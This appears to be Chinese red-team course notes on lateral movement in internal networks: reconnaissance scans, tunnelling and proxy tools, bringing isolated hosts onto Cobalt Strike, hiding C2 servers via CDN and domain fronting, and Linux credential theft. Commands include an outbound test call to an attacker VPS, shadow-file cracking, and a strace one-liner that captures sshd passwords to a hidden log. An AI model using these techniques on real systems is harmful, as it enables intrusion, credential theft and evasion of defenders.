<p>ICMP协议探测<br>TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。<br>nmap扫描<br>•nmap -sn -PE -T4 192.168.0.0/24 （扫描一个C段下的存活主机<br>powershell扫描<br>•powershell.exe ‐exec bypass ‐Command “Import‐Module ./Invoke‐TSPingSweep.ps1;<br>Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135”</p>
<p>SNMP协议探测<br>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。<br>nmap扫描<br>•nmap -sU –script snmp-brute 192.168.1.0/24 -T4<br>msf扫描<br>•msf &gt; use auxiliary/scanner/snmp/snmp_enum</p>
<hr>
<p><strong>内网横向信息收集—端口服务探测</strong></p>
<p>•auxiliary/scanner/discovery/arp_sweep #基于arp协议发现内网存活主机，这不能通过代理使用<br>•auxiliary/scanner/portscan/ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口<br>•auxiliary/scanner/portscan/tcp        #基于tcp进行端口扫描，默认扫描1-10000端口<br>•auxiliary/scanner/discovery/udp_sweep         #基于udp协议发现内网存活主机<br>•auxiliary/scanner/discovery/udp_probe         #基于udp协议发现内网存活主机<br>•auxiliary/scanner/netbios/nbname        #基于netbios协议发现内网存活主机<br>•auxiliary/scanner/ftp/ftp_version        #发现内网ftp服务，基于默认21端口<br>•auxiliary/scanner/ssh/ssh_version        #发现内网ssh服务，基于默认22端口<br>•auxiliary/scanner/telnet/telnet_version         #发现内网telnet服务，基于默认23端口<br>•auxiliary/scanner/dns/dns_amp        #发现dns服务，基于默认53端口</p>
<hr>
<p><strong>其他内网横向信息收集—综合探测</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/uknowsec/TailorScan">https://github.com/uknowsec/TailorScan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/sairson/Yasso">https://github.com/sairson/Yasso</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a><br>•<a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a><br>•<a target="_blank" rel="noopener" href="https://github.com/JKme/cube">https://github.com/JKme/cube</a><br>•<a target="_blank" rel="noopener" href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a><br>•Metasploit<br>•Goby<br>•Cobaltstike</p>
<hr>
<p><strong>其他内网横向信息收集—识别内网环境</strong></p>
<p>获取⽬标的主机存活信息和端⼝开放信息后，就可以尝试分析⽬标的⽹络结构，安全防御策略。一般分为以下几个区<br>•DMZ区<br>•服务区<br>•核心区<br>•测试区<br>•管理区</p>
<p>dmz区<br>在实际的渗透测试中，大多数情况下，在外围 Web 中拿到的权限在 DMZ 区。这个区域不属 于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理，DMZ 区会处在内网区能够访问 DMZ 区,而DMZ 区访问不了内网区的情况下<br>办公区<br>办公区，顾名思义，是指公司员工日常的工作区。办公区的安全防护水平一般不是高，基本防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中，攻击者在获取权限后，利用内网 信任关系，很容易扩大攻击面。一般情况下，攻击者很少会直接到达办公区。攻击者如果想进入 办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。 办公区按照系统可分为 OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒 系统、内部应用监控系统、运维管理系统等，按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等</p>
<p>核心区<br>核心区一般存放企业最重要的数据、文档等信息资产，如域控制器、核心生产机器等，安全设置也最为严格。根据目标开展的业务不同，相关服务器可能存在于不同的网段上。通过分析服务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网 中横向移动时，会优先查找这些主机。 核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网络段可分为各不同的 业务网段、运维监控网段、安全管理网段等</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709142832564.png" alt="image-20220709142832564"></p>
<p>办公网:<br>按照系统区分：<br>•OA系统<br>•邮件系统<br>•财务系统<br>•⽂件共享系统<br>•域控<br>•企业版杀毒系统<br>•上⽹⾏为管理系统<br>•内部应⽤监控系统</p>
<p>按照网络区分：<br>•管理⽹段<br>•内部系统⽹段<br>•按照部⻔区分的⽹段<br>•按照设备区分：<br>•个⼈电脑<br>•内⽹服务器<br>•⽹络设备<br>•安全设备</p>
<p>生产网:<br>按照系统区分：<br>•业务系统<br>•运维监控系统<br>•安全系统</p>
<p>按照网络区分：<br>•各不同的业务⽹段<br>•运维监控⽹段<br>•安全管理⽹段<br>根据⽬标开展的不同业务，对应的服务器可能存在不同的⽹段上，分析服务器上运⾏的服务和进程可以推断⽬标使⽤的运维监控管理系统和安全防护系统，可以⼤概推断出⼊侵⽬标的 IT 运维⽔平和安全防护⽔平，在接下来的⼊侵考虑,采⽤什么样的⽅法。</p>
<hr>
<p><strong>内网横向信息收集—内网拓扑图</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709143007058.png" alt="image-20220709143007058"></p>
<hr>
<p><strong>内网横向信息收集—Web 中间件</strong></p>
<p>•Tomcat<br>•Jboss<br>•Weblogic<br>•WebSphere<br>•Glassfish</p>
<hr>
<p><strong>内网横向信息收集— 常见运维系统</strong></p>
<p>⼀般分自动化部署和运维监控相关的的⼯具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官⽹上的安全通告获取。内⽹的通⽤类应用比较常见的问题是弱⼝令，如果⼀个管理员可以登录⼏个系统，那在这⼏个系统的账号、密码也基本上是⼀样的。<br>•Gitlab<br>•Jenkins<br>•Puppet<br>•Ansible<br>•Nagios<br>•Zabbix<br>•Cacit<br>•Splunk</p>
<hr>
<p><strong>内网横向信息收集—Web信息收集</strong></p>
<p>常见Web 应用<br>还有常⻅邮件应⽤、CMS 应⽤，在搜索引擎上查找对应的漏洞，利⽤已知漏洞进⾏攻击。<br>邮件系统:<br>⼀部分是使⽤腾讯企业邮箱、阿⾥企业邮箱的，很难有可利⽤的漏洞，另外⼀种是能独⽴部署的邮件系统，政企常⽤的邮箱应⽤：<br>•Coremail<br>•亿邮<br>•35互联<br>•TurboMail<br>•Exchange<br>•IBM Lotus</p>
<hr>
<p><strong>内网横向信息收集—数据库/缓存/消息服务</strong></p>
<p>•MySQL数据库<br>•MSSQL数据库<br>•Oracle数据库<br>•PostgreSQL数据库<br>•MongoDB数据库<br>•Redis数据库<br>•SysBase数据库<br>•DB2 数据库</p>
<hr>
<p><strong>内网横向信息收集—常⻅服务/协议</strong></p>
<p>•FTP 服务<br>•NFS 服务<br>•Samba服务<br>•SSH 服务<br>•Telnet 服务<br>•Windows远程连接<br>•VNC服务<br>•SMTP协议<br>•POP3协议<br>•DNS服务<br>•IMAP协议<br>•SNMP协议</p>
<hr>
<p><strong>内网横向信息收集—云环境</strong></p>
<p>Vmware<br>使⽤ VMware vCloud 可将现有数据中⼼内的虚拟基础架构资源池化，并将其作为基于⽬录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使⽤，Vmware vCloud Director 可为客户提供构建安全的私有云，从⽽改变 IT 部⻔交付和管理基础架构服务以及⽤户访问和使⽤这些服务的⽅式。⼀般组织中很多独⽴安装的 Esxi 形式的私有云，或独⽴部署的虚拟化系统。</p>
<p>OpenStack<br>OpenStack是基础设施即服务（IaaS）软件，让任何⼈都可以⾃⾏创建和提供云计算服务。此外，OpenStack也⽤作创建防⽕墙内的“私有云”（Private Cloud），提供机构或企业内各部⻔共享资源。<br>•漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。<br>•权限绕过漏洞<br>•信息泄露<br>•代码执⾏漏洞</p>
<p>Docker<br>•内核漏洞（Kernel exploits） 容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享⼀套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。<br>•拒绝服务攻击（Denial-of-service attacks） 所有的容器都共享了内核资源，如果⼀个容器独占了某⼀个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏⽆法⼯作（形成DoS攻击）。<br>•容器突破（Container breakouts） Linux的namespace机制是容器的核⼼之⼀，它允许容器内部拥有⼀个PID=1的进程⽽在容器外部这个进程号⼜是不⼀样的（⽐如1234）。现在问题在于如果⼀个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。<br>•有毒镜像（Poisoned images） 主要是考虑到镜像本身的安全性，没太多好说的。</p>
<hr>
<p><strong>内网横向信息收集—大数据系统</strong></p>
<p>•Elsaticsearch<br>•Hadoop<br>•Hive<br>•Sqoop<br>•Hbase<br>•Spark</p>
<hr>
<p><strong>内网横向信息收集— 重点核心业务机器</strong></p>
<p>核心业务机器<br>•高管/系统管理员/财务/人事/业务人员的个人计算机。<br>•产品管理系统服务器（仓库管理系统）。<br>•OA 办公系统服务器。<br>•财务应用系统服务器。<br>•核心产品源码服务器（对于 IT 公司，会架设自己的 SVN 或者 GIT 服务器）。<br>•数据库服务器。<br>•文件服务器/共享服务器。<br>•邮件服务器。<br>•网络监控系统服务器。<br>•其他服务器（分公司、工厂）。</p>
<h2 id="内-网-穿-透"><a href="#内-网-穿-透" class="headerlink" title="内 网 穿 透"></a>内 网 穿 透</h2><p><strong>内网穿透原理</strong></p>
<p>内网穿透是:利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p>
<hr>
<p><strong>常用的隧道技术</strong></p>
<p>我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。<br>这些隧道技术可以按所处的协议层分层:<br>•网络层隧道:ICMP隧道等<br>•传输层隧道:TCP隧道、UDP隧道<br>•应用层隧道:HTTP、DNS、SSH等隧道</p>
<hr>
<p><strong>内网主机所有可能的出网方式</strong></p>
<p>•允许ICMP协议出网<br>网络防火墙允许ICMP协议出网，即能ping通外网主机，一般都能出网.<br>•允许特定的TCP或UDP协议端口出网<br>网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。在一个不能出网的网络环境里面，将所有的TCP和UDP端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致。比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行；比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口.<br>•允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）<br>这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议;通常办公网是允许HTTP协议出网的，可能会域名白名单限制.</p>
<hr>
<p><strong>出网探测</strong></p>
<p>查看是否禁止了出站IP或者禁止了出站端口或者禁止了出站协议。<br>情况一：IP白名单<br>•目标主机设置了严格的策略，防火墙只允许目标内网机器主动连接公网指定的IP<br>情况二：出站端口限制<br>•nmap探测<br>    •nmap -sT -Pn -p- -v <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br>•masscan探测<br>    •masscan -p 80,443,8000-9000 IP –rate=10000<br>•Windows<br>    •如果RDP连接上去，可以使用图形化工具(如御剑)。<br>    •如果是webshell，可以使用fscan、nmap</p>
<p>对于禁止出站协议的情况，需要探测目标机器允许哪些协议出网。可以用以下命令判断:<br>Windows ：<br>    •ping -n 2 <a target="_blank" rel="noopener" href="http://baidu.com/">baidu.com</a><br>    •ping -n 2 114.114.114.114<br>    •start <a target="_blank" rel="noopener" href="http://vpnipport/">http://vpsip:port</a><br>Linux ：<br>    •ping -c 2 <a target="_blank" rel="noopener" href="http://baidu.com/">baidu.com</a><br>    •ping -c 2 114.114.114.114<br>    •curl [<a href="http://vpsip:port]">http://vpsip:port]</a><br>注：能解析<a target="_blank" rel="noopener" href="http://baidu.com/">baidu.com</a>意味着DNS可以出网，能ping通代表icmp出网。一般情况下能ping通的tcp也可以出网。在自己vps上执行nc -lvvp 80(尽量使用常规端口)，然后使用curl/start 发起请求，vps收到请求代表出网。</p>
<hr>
<p><strong>端口转发</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154033091.png" alt="image-20220711154033091"></p>
<p>在渗透测试中，当我们获得了外网服务器（如web服务器，ftp服务器，mali服务器等等）的一定权限后发现这台服务器可以直接或者间接的访问内网。此时渗透测试进入后渗透阶段，一般情况下，内网中的其他机器是不允许外网机器访问的。这时候，我们可以通过 端口转发(隧道) 或将这台外网服务器设置成为 “代理”，使得我们自己的攻击机可以直接访问与操作<br>内网中的其他机器。<br>•Netsh实现端口转发<br>•LCX实现端口转发<br>•Ssh实现端口转发</p>
<p>Netsh实现端口转发<br>Netsh 是Windows自带的命令行脚本工具，它可以建立端口映射。<br>•Netsh实现SSH到内网主机(远程端口转发)<br>•Netsh实现3389到内网主机(远程端口转发)<br>•Netsh实现本地端口转发</p>
<p>LCX实现端口转发<br>提起Lcx，可能大家并不会陌生，早些年被称为端口转发神器。Lcx有它的局限性，比如原始版本不支持linux，不免杀等等，但lcx在某些特定的场合依然发挥着重要的作用。同样基于Socket协议。<br>•LCX实现本地端口转发(Windows的场景)<br>•LCX实现本地端口转发(Linux的场景)<br>•LCX实现SSH到内网主机(公网服务器是Windows)<br>•LCX实现SSH到内网主机(公网服务器是Linux)<br>•LCX实现3389到内网主机(公网服务器是Windows)<br>•LCX实现3389到内网主机(公网服务器是Linux)</p>
<hr>
<p><strong>网络层隧道工具</strong></p>
<p>•icmpsh<br>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用<br>•icmptunnel<br>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用<br>•pingtunnel<br>tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</p>
<hr>
<p><strong>传输层隧道工具</strong></p>
<p>•netcat<br>    网络工具中的瑞士军刀，不多介绍，linux系统一般自带<br>•powercat<br>    powershell版的netcat<br>•socat<br>    具有记录转发流的功能，方便查看转发内容，需要安装<br>•netsh<br>    windows系统自带的网络配置工具</p>
<p>•lcx<br>    端口转发工具<br>•NATBypass<br>    一款lcx在golang下的实现,更好的跨平台，更完善的文档<br>•iox<br>    端口转发 &amp; 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。缺点：不支持    监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p>
<hr>
<p><strong>应用层隧道工具</strong></p>
<p>由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等<br>•Dnscat2 不仅可以创建DNS隧道，更是C2<br>•dnscat2-powershell dnscat2的powershell客户端<br>•Dns2tcp TCP over DNS,即通过DNS隧道转发TCP连接<br>•Iodine IPv4 over DNS，即通过DNS隧道转发IPv4数据包<br>•reGeorg SOCKS over HTTP,即通过HTTP隧道转发SOCKS<br>•Neo-reGeorg 重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃<br>•reDuh TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定<br>•Tunna TCP、SOCKS over HTTP,即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定。</p>
<p>•ABPTTS TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp<br>•EarthWorm 十分方便的多级SOCKS代理，已经永久停止更新<br>•Termite EarthWorm的升级版，已经永久停止更新<br>•Venom Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。<br>•Ssocks 正向和反向的socks工具，可执行文件的大小很小<br>•s5.go go语言编写的socks服务工具，良好的跨平台特性</p>
<hr>
<p><strong>应用层隧道工具—DNS协议</strong></p>
<p>DNS隧道原理<br>DNS协议是域名解析协议，在域名和IP地址之间进行转换，该协议也是一种请求/应答协议，也是一种可用于应用层的隧道技术。DNS，ICMP，HTTP/HTTPS等难以禁用的协议已成为攻击者控制隧道的主流隧道.DNS隧道工作的原理：在进行DNS查询时。如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上返回的可以是任意字符串，包括加密的C&amp;C指令。因为DNS在网络世界里不可或缺，所以基于可用性的考虑等，很难做到完全过滤DNS的流量。因此，攻击者可以利用它实现远程控制，文件传输等操作。</p>
<p>Dnscat2<br>dnscat2隧道有两种模式，分别是直连模式和中继模式<br>•直连模式：客户端直接指向IP地址的DNS服务器发起DNS解析请求<br>•中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢<br>一般情况下，我们使用dnscat2的中继模式要更加频繁，因为直连模式的隐蔽性要更差一些。当网段只允许白名单流量出站，同时屏蔽其他端口，传统的C&amp;C通信无法建立。在这样的情况下，可以使用DNS隐蔽隧道建立通信。</p>
<hr>
<p><strong>应用层隧道工具—HTTP协议</strong></p>
<p>HTTP Server代理用于将所有的流量转发到内网。常见的代理工具有reGeorg，meterpreter,tunna等。不出网的环境在实战中很常见，所以HTTP隧道是实战中用的最多的，HTTP隧道的优点相对于以上两个隧道的话就是稳定，ICMP丢包严重，而且非常慢，DNS也不稳定，有域名容易被溯源，他们上线都很麻烦。</p>
<hr>
<p><strong>FRP实现内网socks5反向代理</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>frp 是一个专注于内网穿透的高性能的反向代理 应用，支持 TCP、UDP、HTTP、HTTPS 等多 种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154658565.png" alt="image-20220711154658565"></p>
<p>frp 流量加密压缩对比</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154732523.png" alt="image-20220711154732523"></p>
<p>frp客户端与配置⽂件传到⽬标机后，把 程序名与配置⽂件进⾏修改，并放在系 统相关⽂件夹中，做到隐蔽。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154815368.png" alt="image-20220711154815368"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154828814.png" alt="image-20220711154828814"></p>
<hr>
<p><strong>CobaltStrike (socks4a)</strong></p>
<p>到已控⽬标机的Beacon下将socks代理开启<br>beacon &gt; socks 1024   #端⼝根据VPS实际情况进⾏设置</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154916207.png" alt="image-20220711154916207"></p>
<p>Link 链接，只要主链路 (出⽹机Beacon) 掉线，均掉 ！</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154936406.png" alt="image-20220711154936406"></p>
<hr>
<p><strong>Neo reGeorg</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155007947.png" alt="image-20220711155007947"></p>
<hr>
<p><strong>冰蝎 (开socks5)</strong></p>
<p>冰蝎的数据包传输是加密的，本身也具备socks代理功能，但传输过程中存在丢包情况。这⾥同样是利⽤metasploit 探测ms17_010漏洞，结果显示不存在。当不设置代理探测时，实际漏洞是存在的。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155043604.png" alt="image-20220711155043604"></p>
<hr>
<p><strong>reduh (单端⼝转发)</strong></p>
<p>当⽬标服务器中间件等服务版本较低，reGeorg或冰蝎⻢等⽆法正常解析，就需要换⽤其它的http代理脚本。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155118681.png" alt="image-20220711155118681"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155141882.png" alt="image-20220711155141882"></p>
<hr>
<p><strong>SSH</strong></p>
<p>本地转发<br>把本地端口数据转发到远程服务器，本地服务器 作为SSH客户端及应用户端，称为正向tcp端口 加密转发。<br>远程转发<br>把远程端口数据转发到本地服务器，本地服务器 作为SSH客户端及应用服务端，称为反向tcp端 口加密转发。<br>动态转发<br>动态端口转发实际上是建立一个ssh正向加密的 socks4/5代理通道，任何支持socks4/5协议的 程序都可以使用这个加密的通道来进行代理访问，称为正向加密socks。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155243418.png" alt="image-20220711155243418"></p>
<hr>
<p><strong>单文件</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155302808.png" alt="image-20220711155302808"></p>
<p><strong>Proxifier</strong></p>
<p>➢ 外网 socks<br>➢ 内网 socks<br>➢ 创建 代理链</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155333470.png" alt="image-20220711155333470"></p>
<p>➢ 命令行代理神器<br>➢ 多级代理<br>➢ Socks 口令</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155348617.png" alt="image-20220711155348617"></p>
<hr>
<p><strong>Metasploit</strong></p>
<p>➢ 在获取⽬标⼀个 sessions 后，可以查看IP段信息并⾃动添加路由表。<br>➢ 当知道⽬标路由表信息时，可直接添加 route，之后在metasploit继续渗透。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155428101.png" alt="image-20220711155428101"></p>
<hr>
<p><strong>总结</strong></p>
<p>内网渗透中内网穿透的本质，无非是通过各种通信信道，无论是正向的还是反向的，实现传输层协议tcp/udp数据包的转发，应用层协议都是基于传输层的协议实现的。比如ABPTTS + SOCKS服务 = reGeorg 内网渗透中的内网穿透的条件，能通过某种通信信道远程代码执行。如果能通过某种通信信道远程代码执行，一定可以通过这种通信信道实现tcp/udp数据包的转发，即TCP/UDP over something隧道。如果没有现成的工具，可能需要我们自己开发，隧道客户端将tcp/udp数据<br>包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可。</p>
<hr>
<p><strong>上线不出网机器–实战背景</strong></p>
<p>•获取了webshell的主机位于内网<br>•该内网主机icmp等网络层协议不能出网<br>•tcp和udp等传输层协议不能出网<br>•dns、http等应用层协议也不能出网<br>•唯一的数据通道是反向代理入网的web应用。</p>
<p><strong>上线不出网机器—Goproxy上线CS</strong></p>
<p>本种方式适用于目标机器和DMZ互通的情况下，具体思路如下：<br>跳板机开启http代理供目标机器使用，CobaltStrike新建一个监听器设置HTTP Proxy为跳板机代理地址，CobaltStrike生成stagerless木马上传到目标机器，如不可直接上传可使用跳板机搭配certutil.exe或者命令执行写webshell等方式进行中转上传，目标机器执行木马即可上线。</p>
<p><strong>上线不出网机器—正向木马上线CS</strong></p>
<p>此方法适用于DMZ能通内网但内网不通DMZ的状况即无法反弹会话的情况，遇到这种场景就要使用正向连接的木马来解决，在目标主机开启一个木马端口然后通过跳板机来连接。</p>
<p><strong>上线不出网机器—Pystinger上线CS</strong></p>
<p>毒刺（Pystinger）通过webshell搭建内网socks4代理，可用于上线CobaltStrike，此方法适用于目标主机不出网但存在web应用可被互联网访问的情况.服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量。</p>
<p><strong>上线不出网机器—SMB Beacon上线CS</strong></p>
<p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。<br>使用条件:<br>•具有 SMB Beacon 的主机必须接受 445 端口上的连接。<br>•只能链接由同一个 Cobalt Strike 实例管理的 Beacon。<br>•利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</p>
<h2 id="C-2-流量隐匿"><a href="#C-2-流量隐匿" class="headerlink" title="C 2 流量隐匿"></a>C 2 流量隐匿</h2><p><strong>c2服务器隐藏</strong></p>
<p>在红蓝对抗中，如果攻击者不通过手段隐藏C2服务器，这样可能导致C2被溯源以及被反撸。以下内容讲述如何通过手段隐蔽C2。</p>
<hr>
<p><strong>c2服务器隐藏—配置CDN</strong></p>
<p>给域名设置一个CDN，CS马上线使用域名上线，这样查自己的时候，查的是CDN地址，一定程度隐藏了C2的真实地址，CDN厂商那里把VPS地址绑定到域名上，保证可以和VPS通信。</p>
<hr>
<p><strong>c2服务器隐藏–域前置</strong></p>
<p>域前置技术就是通过CDN节点将流量转发到真实的C2服务器，其中CDN节点ip通过识别请求的Host头进行流量转发。这里作者利用阿里云全站加速CDN实现任意HOST头修改，利用构造高信誉域名，从而实现绕过流量分析。<br>•配置简单<br>•延展性强，可以随时更换IP，在红蓝对抗时可以快速部署，增加了防守封禁IP的难度。<br>•Host高信誉域名。<br>•注意阿里云不支持https的域前置<br>•缺点：对CDN资源较大，不建议长时间使用。</p>
<hr>
<p><strong>c2服务器隐藏–云函数</strong></p>
<p>这个技术最先是在今年的3月份国外提出的，他们利用 azure 对 C2 进行隐藏，国内也有相对应的 云函数厂商，于是我们就尝试使用云函数对我们的 C2 服务器进行隐藏。<br>优势：<br>云函数的好处就是配置简单，免费，高效，很适合日常渗透使用。</p>
<h2 id="横-向-中-的-凭-证-窃-取"><a href="#横-向-中-的-凭-证-窃-取" class="headerlink" title="横 向 中 的 凭 证 窃 取"></a>横 向 中 的 凭 证 窃 取</h2><p><strong>Linux凭证窃取–history记录敏感操作</strong></p>
<p>Linux系统会自动把用户的操作命令记录到历史列表中，当用户在命令行中输入账号、密码进行登录时，将会导致敏感信息泄露。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160505846.png" alt="image-20220711160505846"></p>
<hr>
<p><strong>Linux凭证窃取–shadow文件破解</strong></p>
<p>shadow用于存储 Linux 系统中用户的密码信息，以一个用例来说明：<br>•root:$1$aXmGMjXX$MGrR.Hquwr7UVMwOGOzJV0::0:99999:7:::<br>密码域密文由三部分组成，即：$idsalt$encrypted。当id=1，采用md5进行加密，弱口令容易被破解.</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160712725.png" alt="image-20220711160712725"></p>
<p>当id为5时，采用SHA256进行加密，id为6时，采用SHA512进行加密，可以通过john进行暴力破解。<br>•wget <a target="_blank" rel="noopener" href="https://www.openwall.com/john/k/john-1.9.0.tar.gz">https://www.openwall.com/john/k/john-1.9.0.tar.gz</a><br>•tar -zxvf john-1.9.0.tar.gz<br>•make clean linux-x86-64<br>•./john /etc/shadow</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160740019.png" alt="image-20220711160740019"></p>
<hr>
<p><strong>Linux凭证窃取–mimipenguin抓取密码</strong></p>
<p>一款Linux下的密码抓取神器，需要root权限运行，通过转储进程并提取很可能包含明文密码的行来利用内存中的明文凭证，目前支持Kali、Ubnutu等操作系统。<br>•Github地址：<br>•<a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160810672.png" alt="image-20220711160810672"></p>
<hr>
<p><strong>Linux凭证窃取–使用Strace收集登录凭证</strong></p>
<p>strace是一个动态跟踪工具，堪比键盘记录器的存在，可用来收集登录凭证。<br>获取sshd进程明文密码:<br>•(strace -f -F -p <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;</code> -t -e trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)<br>使用正在来匹配用户和密码：<br>•grep -E ‘read(6, “.+\0\0\0\.+”‘ /tmp/.sshd.log</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711160921929.png" alt="image-20220711160921929"></p>
